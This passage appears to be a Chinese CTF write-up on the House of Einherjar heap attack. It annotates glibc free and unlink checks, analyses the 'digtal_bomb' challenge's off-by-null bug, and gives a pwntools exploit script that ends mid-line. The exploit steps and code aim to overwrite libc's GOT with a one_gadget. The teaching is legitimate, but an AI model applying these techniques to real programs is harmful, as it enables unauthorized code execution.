+<p>接下来申请<code>unsortedbin</code>大小的空间，申请<code>chunk2</code>大小的空间，释放<code>chunk2</code>大小的两个堆块，后放入<code>chunk2</code>，为了绕过<code>fd</code>检查。然后通过申请到的<code>unsortedbin</code>进行修改<code>chunk2</code>的<code>fd</code>指针，可以进行任意地址申请</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910145711777.png" srcset="/img/loading.gif" lazyload alt="image-20250910145711705"></p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="free合法性校验"><a href="#free合法性校验" class="headerlink" title="free合法性校验"></a>free合法性校验</h3><p>当去free一个堆块的时候，调用<code>glibc/malloc/malloc.c</code>中的<code>_int_free</code>函数，该函数前面会进行校验判断，优先考虑放入<code>tcachebins</code>，如果<code>tcachebins</code>满了，且大小符合<code>fashbin</code>，会考虑放入<code>fashbin</code>，最后是放入<code>unsortedbin</code>。此攻击手法主要分析放入<code>unsortedbin</code>的分支。</p>
+<p>当进入<code>unsortedbin</code>分支的时候，首先经过下面的一些校验，通过校验才会成功释放</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 判断要释放的块 p 是否就是 arena 的顶块（top chunk）。</span><br><span class="hljs-comment">   用户不可能拿到 top chunk 的指针来 free；出现即视为 double free/堆损坏。 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (top)&quot;</span>);<br><br><span class="hljs-comment">/* 检查 nextchunk 是否越界到 arena 之外（仅在“连续堆”模式下）。</span><br><span class="hljs-comment">   对于 contiguous(av) 的 arena，(char*)nextchunk 不能超过</span><br><span class="hljs-comment">   av-&gt;top 的末尾地址 (char*)av-&gt;top + chunksize(av-&gt;top)。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>                      &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>                         &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize (av-&gt;top)), <span class="hljs-number">0</span>))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br><br><span class="hljs-comment">/* 检查 nextchunk 头部里的 prev_inuse 位。</span><br><span class="hljs-comment">   正常在我们调用 free(p) 之前，p 是“已使用”的，因此 nextchunk-&gt;prev_inuse 应为 1。</span><br><span class="hljs-comment">   若为 0，说明前块被标记为空闲（可能是 double free 或标志被篡改）。 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse (nextchunk)))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>);<br><br><span class="hljs-comment">/* 取下一个物理块的“真实大小”（屏蔽低位标志位后的尺寸）。 */</span><br>nextsize = chunksize (nextchunk);<br><br><span class="hljs-comment">/* 下一个块的大小合法性检查：</span><br><span class="hljs-comment">   1) 不屏蔽标志位的原始 size（chunksize_nomask）小于等于块头大小（CHUNK_HDR_SZ）→ 太小，装不下头部，判坏；</span><br><span class="hljs-comment">   2) 屏蔽后的真实大小（nextsize）若大于等于该 arena 向系统申请的总内存（av-&gt;system_mem）→ 过大，判坏。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>  malloc_printerr (<span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>);<br><span class="hljs-comment">/* 通过检查后进行释放 */</span><br>free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="向前合并校验"><a href="#向前合并校验" class="headerlink" title="向前合并校验"></a>向前合并校验</h3><p>经过合法性检查之后下面进行<code>unlink</code>条件判断，首先进行向前合并检查。</p>
+<ul>
+<li>根据<code>prev_inuse</code>判断，如果<code>prev_inuse</code>为<code>0</code>说明上一个<code>chunk</code>未在使用，通过<code>prevsize</code>更新指针，如果伪造<code>prevsize</code>大小就会造成指针指向我们伪造的地址，经过检查之后，进行向前合并操作，造成堆块重叠。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 若当前块 p 的“前块在用”标志为 0（说明前一个物理块是空闲的），</span><br><span class="hljs-comment">   则需要与前块进行向前合并（backward coalescing）。*/</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  <span class="hljs-comment">/* 从当前块头部读取记录的前块大小（prev_size 字段）。*/</span><br>  prevsize = prev_size (p);<br>  <span class="hljs-comment">/* 合并大小：当前块 size 加上前块 size。*/</span><br>  size += prevsize;<br>  <span class="hljs-comment">/* 指针回退 prevsize 个字节，定位到“前一个物理块”的块头地址。*/</span><br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  <span class="hljs-comment">/* 一致性检查：前块头里的 size 必须与我们读取到的 prevsize 匹配，</span><br><span class="hljs-comment">     否则认为堆元数据被破坏（常见于越界/伪造 size）。*/</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-comment">/* 将这个“前块”（此时是空闲块）从其所在 bin 的双向链表中摘除（unlink），</span><br><span class="hljs-comment">     为后续把两块合并成更大的空闲块做准备。</span><br><span class="hljs-comment">     这里会触发安全 unlink 检查（FD/BK 指针一致性等）。*/</span><br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>原理图如下</p>
+<p>伪造蓝色堆块和绿色堆块的<code>prevsize</code>，然后<code>free</code>绿色堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183124931.png" srcset="/img/loading.gif" lazyload alt="image-20250910183124817"></p>
+<h3 id="向后合并校验"><a href="#向后合并校验" class="headerlink" title="向后合并校验"></a>向后合并校验</h3><p>如果不符合向前合并条件，就接着检查向后合并</p>
+<ul>
+<li>如果下一个<code>nextchunk</code>不是<code>topchunk</code>，进入分支判断下一个<code>chunk</code>的是否在使用，如果空闲进行合并，非空闲仅把<code>p_inuse</code>位置0</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;                     <span class="hljs-comment">// 如果后继物理块不是 top chunk，进入常规处理</span><br><br>  <span class="hljs-comment">/* 读取 nextchunk 的“inuse”状态。</span><br><span class="hljs-comment">     注意：一个块是否在用，是通过“其后一个块头部的 prev_inuse 位”来判断的。</span><br><span class="hljs-comment">     inuse_bit_at_offset(q, sz) ≈ 查看 chunk_at_offset(q, sz) 的 prev_inuse。</span><br><span class="hljs-comment">     这里传入 (nextchunk, nextsize)，即检查“nextchunk 的后一个块”记录的 prev_inuse，</span><br><span class="hljs-comment">     从而得知 nextchunk 本身是否在用。*/</span><br>  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>  <span class="hljs-comment">/* 若 nextchunk 也是空闲的，执行向前合并（forward coalescing）：</span><br><span class="hljs-comment">     先把 nextchunk 从其所在 bin 的双向链表中摘除（unlink），</span><br><span class="hljs-comment">     再把它的大小并入当前块的 size。*/</span><br>  <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>    unlink_chunk (av, nextchunk);<br>    size += nextsize;<br>  &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* 否则（nextchunk 在用），不能合并。</span><br><span class="hljs-comment">       仅需把 nextchunk 头部里的 prev_inuse 清零，表示“当前块 p 已经空闲”，</span><br><span class="hljs-comment">       以便将来当 nextchunk 被 free 时，可以与 p 合并。*/</span><br>    clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="unlink-chunk合法性校验"><a href="#unlink-chunk合法性校验" class="headerlink" title="unlink_chunk合法性校验"></a>unlink_chunk合法性校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c">unlink_chunk (mstate av, mchunkptr p)<br>&#123;<br>  <span class="hljs-comment">/* 一致性检查：当前块 p 的 size 必须等于“后继物理块”的 prev_size。</span><br><span class="hljs-comment">     若不相等，说明元数据被破坏（越界写/伪造 size 等）。 */</span><br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  <span class="hljs-comment">/* 取出 bin 中的前向/后向指针（双向链表）。 */</span><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-comment">/* 双向链表完整性检查：</span><br><span class="hljs-comment">     - 正常应有 fd-&gt;bk == p 且 bk-&gt;fd == p</span><br><span class="hljs-comment">     - 任一不满足即链表被破坏（典型于 unsafe unlink/伪造指针）。 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  <span class="hljs-comment">/* 将 p 从（普通大小序的）bin 双向链表中摘除。 */</span><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br><span class="hljs-comment">/* ============================================================================================================*/</span><br>  <span class="hljs-comment">/* 若 p 属于 largebin（非 smallbin），且存在按“块大小”排序的次级链表指针，</span><br><span class="hljs-comment">     还需要从“size 有序环”里把 p 摘掉。smallbin 没有 nextsize 链。 */</span><br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* 次级链表（按大小排序）的完整性检查：</span><br><span class="hljs-comment">         - 正常应有 p-&gt;fd_nextsize-&gt;bk_nextsize == p</span><br><span class="hljs-comment">         -        且 p-&gt;bk_nextsize-&gt;fd_nextsize == p */</span><br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>          || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-comment">/* 如果 p 被摘除后，其所属 bin 的表头 fd 没有配置次级链，</span><br><span class="hljs-comment">         则需要把 p 的次级链“移交/闭环”给 fd。 */</span><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-comment">/* 情况 A：p 自身构成一个单节点的 size 环（指向自己）。</span><br><span class="hljs-comment">             摘掉 p 后，将 fd 自己设置为单节点环。 */</span><br>          <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>            fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">/* 情况 B：p 的 size 环里有其他节点：</span><br><span class="hljs-comment">                 用 fd 替换 p 在次级环中的位置，维持有序环不破。 */</span><br>              fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>              fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>              p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>              p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* 否则（fd 已有次级链），直接把 p 从 size 环里断开连接。 */</span><br>          p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>          p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="校验绕过"><a href="#校验绕过" class="headerlink" title="校验绕过"></a>校验绕过</h2><p>经过源码分析，我们可以利用的分支只有向前合并，总结出如下需要绕过的校验</p>
+<ul>
+<li>要释放的<code>chunk</code>的<code>prev_inuse</code>位为<code>0</code>（通过堆溢出、off-by-null、off-by-one进行设置）</li>
+<li>被合并的<code>chunk</code>的size必须和释放的<code>prev_size</code>相同（由于空间复用，可以编辑当前堆块，设置下一个堆块的<code>prev_size</code>）</li>
+<li>被合并的<code>chunk</code>的<code>fd-bk</code>和<code>bk-fd</code>必须指向自己（通过设置<code>fd</code>和<code>bk</code>都为当前堆块的地址绕过）</li>
+</ul>
+<h2 id="湾区杯2025-digtal-bomb"><a href="#湾区杯2025-digtal-bomb" class="headerlink" title="湾区杯2025-digtal_bomb"></a>湾区杯2025-digtal_bomb</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><code>ida</code>反编译进行简单的函数、变量重命名，然后进入<code>welcome</code>函数，发现题目介绍是实现了一个你和电脑共同排除炸弹的功能</p>
+<p>首先分析main函数。让你输入一个炸弹范围，然后通过伪随机生成一个炸弹数，并且炸弹数控制在你输入的范围内。然后进入一个循环，会通过<code>inputgGuessNum</code>函数让你输入一个数，然后对你输入的数通过<code>chunk1</code>函数进行校验</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183847068.png" srcset="/img/loading.gif" lazyload alt="image-20250910183846884"></p>
+<p>我们跟进函数<code>chunk1</code>，如果我们猜的数是炸弹数，就会爆炸<code>return 1</code>，如果我们没有猜到炸弹数，就会通过<code>update_boundary</code>进行更新边界然后当仅剩一个数的时候，且这个数是炸弹数的时候，就会进入<code>heapFunc</code>函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910184611911.png" srcset="/img/loading.gif" lazyload alt="image-20250910184611789"></p>
+<p>继续跟进<code>update_boundary</code>函数，是一个更新边界的函数，通过分析我们可以实习100绕过炸弹数，开始输入<code>499-500</code>，然后随机数就会随机到<code>499</code>，然后输入<code>500</code>，边界更新为<code>499-499</code>，完成炸弹数绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910220533085.png" srcset="/img/loading.gif" lazyload alt="image-20250910220525932"></p>
+<p>接着进入函数<code>heapFunc</code>，是一个经典的堆题样式。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185034168.png" srcset="/img/loading.gif" lazyload alt="image-20250910185034013"></p>
+<p>首先跟进add函数，只允许创建<code>10</code>个堆块，且有大小限制在<code>0x10-0x800</code>，申请的堆块地址储存在<code>chunk_addr</code>，然后向堆块输入数据，并在数据末位进行<code>\x00</code>截断，这里就造成了<code>off-by-null</code>漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185112663.png" srcset="/img/loading.gif" lazyload alt="image-20250910185112515"></p>
+<p>然后跟进<code>free</code>函数，正常的<code>free</code>，不存在<code>UAF</code>漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221154143.png" srcset="/img/loading.gif" lazyload alt="image-20250910221154027"></p>
+<p>跟进<code>show</code>函数，会打印堆块内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221240012.png" srcset="/img/loading.gif" lazyload alt="image-20250910221239898"></p>
+<p>最后跟进<code>edit_one</code>函数，只有一次编辑功能，且和申请的编辑不一样，不存在<code>/x00</code>截断，可以配合<code>show</code>函数进行地址泄露</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221340660.png" srcset="/img/loading.gif" lazyload alt="image-20250910221340536"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
+<li>利用炸断数生成缺陷，绕过炸弹，进入heap功能</li>
+<li>利用<code>largerbin</code>和<code>edit</code>函数泄露<code>heap</code>地址</li>
+<li>利用<code>off-by-null</code>漏洞配合<code>house_of_einherjar</code>攻击手法造成堆块重叠</li>
+<li>利用堆块重叠泄露地址泄露<code>libc</code>地址</li>
+<li>利用堆块重叠修改堆块<code>fd</code>指针</li>
+<li>打<code>libc.got</code>，修改<code>strlen</code>的<code>got</code>表为<code>onegadget</code></li>
+</ul>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Basic PWN Template - basis Template </span><br><span class="hljs-string">Author: p0ach1l</span><br><span class="hljs-string">Date: 2025-09-09</span><br><span class="hljs-string">description: no description</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnscript <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;./digtal_bomb&quot;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * main</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=<span class="hljs-string">&#x27;&#x27;</span>)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice &gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size , content</span>) :<br>  choice(<span class="hljs-number">1</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>  sleep(<span class="hljs-number">0.1</span>)<br>  p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  choice(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  choice(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>) :<br>  choice(<span class="hljs-number">666</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>  sleep(<span class="hljs-number">0.1</span>)<br>  p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">begin</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter min (0-500): &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">499</span>))<br>  p.sendlineafter(<span class="hljs-string">&quot;Enter max (0-500): &quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br>  p.sendlineafter(<span class="hljs-string">&quot;Your guess :&quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br><br>begin()<br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x490</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;b&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x4f0</span> , <span class="hljs-string">b&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x490</span> , <span class="hljs-string">b&#x27;d&#x27;</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">7</span> , <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;e&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x90</span>) + p64(heap_addr + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x38</span> , payload)<br><br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;h&#x27;</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0xf8</span> , p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br><br>free(<span class="hljs-number">2</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , payload)<br><br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;i&#x27;</span>)<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;j&#x27;</span>)<br>add(<span class="hljs-number">6</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;k&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;l&#x27;</span>)<br>add(<span class="hljs-number">8</span> , 